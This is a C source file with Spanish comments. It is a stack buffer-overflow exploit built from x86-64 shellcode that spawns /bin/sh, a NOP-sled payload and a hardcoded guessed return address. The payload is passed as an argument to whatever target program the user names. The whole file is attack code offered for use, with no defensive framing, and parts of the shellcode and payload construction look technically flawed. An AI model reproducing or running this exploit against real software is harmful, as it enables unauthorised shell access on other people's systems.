#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFFER_SIZE 64
#define NOP 0x90

unsigned char shellcode[] = 
    "\x48\x31\xff"          // xor    %rdi, %rdi
    "\x48\x31\xf6"          // xor    %rsi, %rsi
    "\x48\x31\xd2"          // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" // /bin/sh, %rbx
    "\x48\xc1\xeb\x08"    // shr    $0x8, %rbx
    "\x53"                  // push   %rbx
    "\x48\x89\xe7"          // mov    %rsp, %rdi
    "\x50"                  // push   %rax
    "\x57"                  // push   %rdi
    "\x48\x89\xe6"          // mov    %rsp, %rsi
    "\xb0\x3b"              // mov    $0x3b, %al
    "\x0f\x05";             // syscall

void exploit(char *vulnerable_program) {
    char payload[BUFFER_SIZE + 16]; // Buffer overflow más espacio para la dirección de retorno
    memset(payload, NOP, sizeof(payload)); // Rellenamos con NOPs
    
    // Copiamos el shellcode al final del buffer para garantizar la ejecución
    memcpy(payload + (BUFFER_SIZE - sizeof(shellcode)), shellcode, sizeof(shellcode) - 1);
    
    // Sobreescribimos la dirección de retorno con una dirección dentro de nuestro buffer (ajustar según el sistema)
    void *ret_address = (void *)(0x7fffffffe200); // Dirección de retorno estimada
    memcpy(payload + BUFFER_SIZE, &ret_address, sizeof(void*));
    
    printf("Ejecutando el exploit...\n");
    execl(vulnerable_program, vulnerable_program, payload, NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Uso: %s <programa_vulnerable>\n", argv[0]);
        return 1;
    }
    
    exploit(argv[1]);
    return 0;
}
